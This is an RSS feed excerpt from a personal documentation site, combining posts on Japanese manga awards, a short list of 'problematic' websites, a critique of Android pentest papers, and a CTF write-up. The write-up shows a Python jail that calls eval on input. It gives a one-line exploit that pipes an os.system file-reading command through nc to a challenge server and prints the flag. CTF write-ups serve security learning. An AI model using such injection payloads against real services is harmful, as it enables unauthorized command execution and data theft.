&lt;li>&lt;strong>主要獎項&lt;/strong>：
&lt;ul>
&lt;li>&lt;strong>大獎&lt;/strong>（漫畫界最重要的榮譽之一）&lt;/li>
&lt;li>&lt;strong>優秀獎&lt;/strong>&lt;/li>
&lt;li>&lt;strong>特別獎&lt;/strong>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;hr>
&lt;h3 id="-商業漫畫雜誌獎">
 &lt;strong>🏆 商業漫畫雜誌獎&lt;/strong>
 &lt;a class="anchor" href="#-%e5%95%86%e6%a5%ad%e6%bc%ab%e7%95%ab%e9%9b%9c%e8%aa%8c%e7%8d%8e">#&lt;/a>
&lt;/h3>
&lt;h4 id="4-小學館漫畫獎小学館漫画賞">
 &lt;strong>4. 小學館漫畫獎（小学館漫画賞）&lt;/strong>
 &lt;a class="anchor" href="#4-%e5%b0%8f%e5%ad%b8%e9%a4%a8%e6%bc%ab%e7%95%ab%e7%8d%8e%e5%b0%8f%e5%ad%a6%e9%a4%a8%e6%bc%ab%e7%94%bb%e8%b3%9e">#&lt;/a>
&lt;/h4>
&lt;ul>
&lt;li>&lt;strong>主辦單位&lt;/strong>：小學館&lt;/li>
&lt;li>&lt;strong>創立時間&lt;/strong>：1955年&lt;/li>
&lt;li>&lt;strong>特色&lt;/strong>：針對大眾市場，獎勵受歡迎且有影響力的作品。&lt;/li>
&lt;li>&lt;strong>獎項類別&lt;/strong>：
&lt;ul>
&lt;li>&lt;strong>兒童向類別&lt;/strong>&lt;/li>
&lt;li>&lt;strong>少年漫畫類別&lt;/strong>&lt;/li>
&lt;li>&lt;strong>少女漫畫類別&lt;/strong>&lt;/li>
&lt;li>&lt;strong>一般向類別&lt;/strong>&lt;/li>
&lt;li>&lt;strong>特別獎（不定期頒發）&lt;/strong>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;hr>
&lt;h4 id="5-講談社漫畫獎講談社漫画賞">
 &lt;strong>5. 講談社漫畫獎（講談社漫画賞）&lt;/strong>
 &lt;a class="anchor" href="#5-%e8%ac%9b%e8%ab%87%e7%a4%be%e6%bc%ab%e7%95%ab%e7%8d%8e%e8%ac%9b%e8%ab%87%e7%a4%be%e6%bc%ab%e7%94%bb%e8%b3%9e">#&lt;/a>
&lt;/h4>
&lt;ul>
&lt;li>&lt;strong>主辦單位&lt;/strong>：講談社&lt;/li>
&lt;li>&lt;strong>創立時間&lt;/strong>：1977年&lt;/li>
&lt;li>&lt;strong>特色&lt;/strong>：涵蓋少年、少女及一般向漫畫，強調市場影響力與人氣。&lt;/li>
&lt;li>&lt;strong>獎項類別&lt;/strong>：
&lt;ul>
&lt;li>&lt;strong>少年漫畫部門&lt;/strong>&lt;/li>
&lt;li>&lt;strong>少女漫畫部門&lt;/strong>&lt;/li>
&lt;li>&lt;strong>一般向漫畫部門&lt;/strong>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;hr>
&lt;h4 id="6-集英社漫畫獎手塚獎--赤塚獎">
 &lt;strong>6. 集英社漫畫獎（手塚獎 &amp;amp; 赤塚獎）&lt;/strong>
 &lt;a class="anchor" href="#6-%e9%9b%86%e8%8b%b1%e7%a4%be%e6%bc%ab%e7%95%ab%e7%8d%8e%e6%89%8b%e5%a1%9a%e7%8d%8e--%e8%b5%a4%e5%a1%9a%e7%8d%8e">#&lt;/a>
&lt;/h4>
&lt;ul>
&lt;li>&lt;strong>主辦單位&lt;/strong>：集英社（《週刊少年Jump》）&lt;/li>
&lt;li>&lt;strong>創立時間&lt;/strong>：1971年&lt;/li>
&lt;li>&lt;strong>特色&lt;/strong>：專為新人漫畫家設立，分為劇情漫畫與搞笑漫畫兩類。&lt;/li>
&lt;li>&lt;strong>獎項類別&lt;/strong>：
&lt;ul>
&lt;li>&lt;strong>手塚獎&lt;/strong>（劇情漫畫類）&lt;/li>
&lt;li>&lt;strong>赤塚獎&lt;/strong>（搞笑漫畫類）&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;hr>
&lt;h3 id="-特定題材或類型獎">
 &lt;strong>🔹 特定題材或類型獎&lt;/strong>
 &lt;a class="anchor" href="#-%e7%89%b9%e5%ae%9a%e9%a1%8c%e6%9d%90%e6%88%96%e9%a1%9e%e5%9e%8b%e7%8d%8e">#&lt;/a>
&lt;/h3>
&lt;h4 id="7-星雲獎星雲賞">
 &lt;strong>7. 星雲獎（星雲賞）&lt;/strong>
 &lt;a class="anchor" href="#7-%e6%98%9f%e9%9b%b2%e7%8d%8e%e6%98%9f%e9%9b%b2%e8%b3%9e">#&lt;/a>
&lt;/h4>
&lt;ul>
&lt;li>&lt;strong>主辦單位&lt;/strong>：日本科幻作家俱樂部&lt;/li>
&lt;li>&lt;strong>創立時間&lt;/strong>：1970年&lt;/li>
&lt;li>&lt;strong>特色&lt;/strong>：專門表彰優秀的 &lt;strong>科幻類&lt;/strong> 漫畫、小說、動畫作品。&lt;/li>
&lt;/ul>
&lt;hr>
&lt;h4 id="8-這本漫畫真厲害このマンガがすごい">
 &lt;strong>8. 這本漫畫真厲害！（このマンガがすごい！）&lt;/strong>
 &lt;a class="anchor" href="#8-%e9%80%99%e6%9c%ac%e6%bc%ab%e7%95%ab%e7%9c%9f%e5%8e%b2%e5%ae%b3%e3%81%93%e3%81%ae%e3%83%9e%e3%83%b3%e3%82%ac%e3%81%8c%e3%81%99%e3%81%94%e3%81%84">#&lt;/a>
&lt;/h4>
&lt;ul>
&lt;li>&lt;strong>主辦單位&lt;/strong>：寶島社&lt;/li>
&lt;li>&lt;strong>創立時間&lt;/strong>：2005年&lt;/li>
&lt;li>&lt;strong>特色&lt;/strong>：由漫畫愛好者、評論家評選，分為「男性向」與「女性向」榜單，專注於話題性與創新性。&lt;/li>
&lt;/ul>
&lt;hr>
&lt;h4 id="9-漫畫大獎マンガ大賞">
 &lt;strong>9. 漫畫大獎（マンガ大賞）&lt;/strong>
 &lt;a class="anchor" href="#9-%e6%bc%ab%e7%95%ab%e5%a4%a7%e7%8d%8e%e3%83%9e%e3%83%b3%e3%82%ac%e5%a4%a7%e8%b3%9e">#&lt;/a>
&lt;/h4>
&lt;ul>
&lt;li>&lt;strong>主辦單位&lt;/strong>：漫畫評論家團體&lt;/li>
&lt;li>&lt;strong>創立時間&lt;/strong>：2008年&lt;/li>
&lt;li>&lt;strong>特色&lt;/strong>：由漫畫編輯、書店店員選出的 &lt;strong>純讀者口碑獎&lt;/strong>，不分少年、少女類型，強調新銳作品。&lt;/li>
&lt;/ul>
&lt;hr>
&lt;h3 id="-最新話題性漫畫獎">
 &lt;strong>🔥 最新話題性漫畫獎&lt;/strong>
 &lt;a class="anchor" href="#-%e6%9c%80%e6%96%b0%e8%a9%b1%e9%a1%8c%e6%80%a7%e6%bc%ab%e7%95%ab%e7%8d%8e">#&lt;/a>
&lt;/h3>
&lt;h4 id="10-next-manga-award次にくるマンガ大賞">
 &lt;strong>10. Next Manga Award（次にくるマンガ大賞）&lt;/strong>
 &lt;a class="anchor" href="#10-next-manga-award%e6%ac%a1%e3%81%ab%e3%81%8f%e3%82%8b%e3%83%9e%e3%83%b3%e3%82%ac%e5%a4%a7%e8%b3%9e">#&lt;/a>
&lt;/h4>
&lt;ul>
&lt;li>&lt;strong>主辦單位&lt;/strong>：niconico &amp;amp; 《Da Vinci》雜誌&lt;/li>
&lt;li>&lt;strong>創立時間&lt;/strong>：2014年&lt;/li>
&lt;li>&lt;strong>特色&lt;/strong>：網友投票選出 &lt;strong>最有潛力的未來熱門作品&lt;/strong>。&lt;/li>
&lt;li>&lt;strong>獎項類別&lt;/strong>：
&lt;ul>
&lt;li>&lt;strong>紙本漫畫部門&lt;/strong>&lt;/li>
&lt;li>&lt;strong>網路漫畫部門&lt;/strong>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;hr>
&lt;h3 id="-總結">
 &lt;strong>📌 總結&lt;/strong>
 &lt;a class="anchor" href="#-%e7%b8%bd%e7%b5%90">#&lt;/a>
&lt;/h3>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>&lt;strong>獎項名稱&lt;/strong>&lt;/th>
 &lt;th>&lt;strong>創立年份&lt;/strong>&lt;/th>
 &lt;th>&lt;strong>特色&lt;/strong>&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>&lt;strong>手塚治虫文化獎&lt;/strong>&lt;/td>
 &lt;td>1997年&lt;/td>
 &lt;td>重視藝術性與影響力&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;strong>文化廳媒體藝術祭&lt;/strong>&lt;/td>
 &lt;td>1997年&lt;/td>
 &lt;td>涵蓋漫畫、動畫、遊戲等多媒體&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;strong>日本漫畫家協會獎&lt;/strong>&lt;/td>
 &lt;td>1972年&lt;/td>
 &lt;td>由漫畫家協會評選&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;strong>小學館漫畫獎&lt;/strong>&lt;/td>
 &lt;td>1955年&lt;/td>
 &lt;td>針對大眾市場的作品&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;strong>講談社漫畫獎&lt;/strong>&lt;/td>
 &lt;td>1977年&lt;/td>
 &lt;td>分少年、少女、一般向&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;strong>集英社手塚 &amp;amp; 赤塚獎&lt;/strong>&lt;/td>
 &lt;td>1971年&lt;/td>
 &lt;td>專為新人漫畫家設立&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;strong>星雲獎&lt;/strong>&lt;/td>
 &lt;td>1970年&lt;/td>
 &lt;td>科幻漫畫專門獎&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;strong>這本漫畫真厲害！&lt;/strong>&lt;/td>
 &lt;td>2005年&lt;/td>
 &lt;td>書店與評論家評選&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;strong>漫畫大獎&lt;/strong>&lt;/td>
 &lt;td>2008年&lt;/td>
 &lt;td>書店推薦的高人氣新作&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;strong>次にくるマンガ大賞&lt;/strong>&lt;/td>
 &lt;td>2014年&lt;/td>
 &lt;td>預測未來爆紅作品&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;p>這些獎項的影響力各有不同，像「手塚治虫文化獎」、「文化廳媒體藝術祭」偏向藝術性，而「這本漫畫真厲害！」與「次にくるマンガ大賞」則更注重話題性與市場趨勢。&lt;/p></description></item><item><title>有問題的網站</title><link>https://bernie6401.github.io/docs/tools/others/%E6%9C%89%E5%95%8F%E9%A1%8C%E7%9A%84%E7%B6%B2%E7%AB%99/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/tools/others/%E6%9C%89%E5%95%8F%E9%A1%8C%E7%9A%84%E7%B6%B2%E7%AB%99/</guid><description>&lt;h1 id="有問題的網站">
 有問題的網站
 &lt;a class="anchor" href="#%e6%9c%89%e5%95%8f%e9%a1%8c%e7%9a%84%e7%b6%b2%e7%ab%99">#&lt;/a>
&lt;/h1>
&lt;ul>
&lt;li>金讚城
&lt;a href="http://www.ru.com.tw">http://www.ru.com.tw&lt;/a>
&lt;a href="http://www.jzc.com.tw">http://www.jzc.com.tw&lt;/a>&lt;/li>
&lt;li>華文網
&lt;a href="https://www.book4u.com.tw/">https://www.book4u.com.tw/&lt;/a>&lt;/li>
&lt;/ul></description></item><item><title>有關Pentest但貢獻很爛的三篇論文</title><link>https://bernie6401.github.io/docs/survey-papers/android-+-security/tool/%E6%9C%89%E9%97%9Cpentest%E4%BD%86%E8%B2%A2%E7%8D%BB%E5%BE%88%E7%88%9B%E7%9A%84%E4%B8%89%E7%AF%87%E8%AB%96%E6%96%87/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/survey-papers/android-+-security/tool/%E6%9C%89%E9%97%9Cpentest%E4%BD%86%E8%B2%A2%E7%8D%BB%E5%BE%88%E7%88%9B%E7%9A%84%E4%B8%89%E7%AF%87%E8%AB%96%E6%96%87/</guid><description>&lt;h1 id="risk-analysis-and-android-application-penetration-testing-based-on-owasp-2016">
 Risk analysis and Android application penetration testing based on OWASP 2016
 &lt;a class="anchor" href="#risk-analysis-and-android-application-penetration-testing-based-on-owasp-2016">#&lt;/a>
&lt;/h1>
&lt;p>:::info
Borja, T., Benalcázar, M. E., Valdivieso Caraguay, Á. L., &amp;amp; Barona López, L. I. (2021). Risk analysis and Android application penetration testing based on OWASP 2016. In Information Technology and Systems: ICITS 2021, Volume 1 (pp. 461-478). Springer International Publishing.
:::&lt;/p>
&lt;h2 id="introduction">
 Introduction
 &lt;a class="anchor" href="#introduction">#&lt;/a>
&lt;/h2>
&lt;p>嚴格來說，這一篇不是完全沒用，但真的貢獻超級低，他基本上就是照著之前寫過的&lt;sup id="fnref:1">&lt;a href="#fn:1" class="footnote-ref" role="doc-noteref">1&lt;/a>&lt;/sup>流程和動機甚至實驗方法做而已，最後再加上自己的一些見解(也就是所謂的風險評估矩陣和針對每一個Risk寫出自己的建議或是mitigation)，就這樣沒了，詳細對比如下
![圖片](&lt;a href="https://hackmd.io/_uploads/r1eR14KBA.png">https://hackmd.io/_uploads/r1eR14KBA.png&lt;/a> =400x)
Reference 8就是&lt;sup id="fnref1:1">&lt;a href="#fn:1" class="footnote-ref" role="doc-noteref">1&lt;/a>&lt;/sup>&lt;/p>
&lt;h2 id="proposed-method">
 Proposed Method
 &lt;a class="anchor" href="#proposed-method">#&lt;/a>
&lt;/h2>
&lt;p>作者自行創立一個Score Scale如下
&lt;img src="https://hackmd.io/_uploads/HJf8g4KrR.png" alt="圖片1" />
總共有四個向度，前三個向度相加取平均後*最後一個向度就是該Risk的分數，
&lt;img src="https://hackmd.io/_uploads/SJsclVKr0.png" alt="圖片2" />
實驗後的級距分野如下
![圖片](&lt;a href="https://hackmd.io/_uploads/HJlAg4tBR.png">https://hackmd.io/_uploads/HJlAg4tBR.png&lt;/a> =300x)&lt;/p></description></item><item><title>神盾盃2023初賽</title><link>https://bernie6401.github.io/docs/security/competition/%E7%A5%9E%E7%9B%BE%E7%9B%832023%E5%88%9D%E8%B3%BD/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/competition/%E7%A5%9E%E7%9B%BE%E7%9B%832023%E5%88%9D%E8%B3%BD/</guid><description>&lt;h1 id="神盾盃2023初賽">
 神盾盃2023初賽
 &lt;a class="anchor" href="#%e7%a5%9e%e7%9b%be%e7%9b%832023%e5%88%9d%e8%b3%bd">#&lt;/a>
&lt;/h1>
&lt;h2 id="jail1">
 Jail1
 &lt;a class="anchor" href="#jail1">#&lt;/a>
&lt;/h2>
&lt;h3 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">while&lt;/span> &lt;span style="color:#66d9ef">True&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ip &lt;span style="color:#f92672">=&lt;/span> input(&lt;span style="color:#e6db74">&amp;#34;AEGIS&amp;gt; &amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#e6db74">&amp;#39;hint&amp;#39;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> ip&lt;span style="color:#f92672">.&lt;/span>lower():
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(__import__(&lt;span style="color:#e6db74">&amp;#39;os&amp;#39;&lt;/span>)&lt;span style="color:#f92672">.&lt;/span>system(&lt;span style="color:#e6db74">&amp;#39;cat jail.py&amp;#39;&lt;/span>))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> exit()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#e6db74">&amp;#39;flag&amp;#39;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> ip&lt;span style="color:#f92672">.&lt;/span>lower():
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#34;Sorry, I don&amp;#39;t like any &lt;/span>&lt;span style="color:#ae81ff">\&amp;#34;&lt;/span>&lt;span style="color:#e6db74">FLAG&lt;/span>&lt;span style="color:#ae81ff">\&amp;#34;&lt;/span>&lt;span style="color:#e6db74">!&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">continue&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(eval(ip))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">except&lt;/span> &lt;span style="color:#a6e22e">Exception&lt;/span> &lt;span style="color:#66d9ef">as&lt;/span> error:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#34;ERROR:&amp;#34;&lt;/span>, error)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#34;Good luck next time!&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">pass&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h3>
&lt;p>應該是基本的jail escape，可以看到source code中擋掉了flag string，所以可以直接用萬用字元一樣畫葫蘆就拿到flag，水題中的水題&lt;/p>
&lt;h3 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ echo &lt;span style="color:#e6db74">&amp;#34;print(__import__(&amp;#39;os&amp;#39;).system(&amp;#39;cat fla*&amp;#39;))&amp;#34;&lt;/span> | nc 35.234.20.42 &lt;span style="color:#ae81ff">8000&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Flag: &lt;code>AEGIS{600d_j0b_70_byp455_fl46}&lt;/code>&lt;/p>
&lt;h2 id="jail2">
 Jail2
 &lt;a class="anchor" href="#jail2">#&lt;/a>
&lt;/h2>
&lt;h3 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h3>
&lt;p>SSTI&lt;/p></description></item></channel></rss>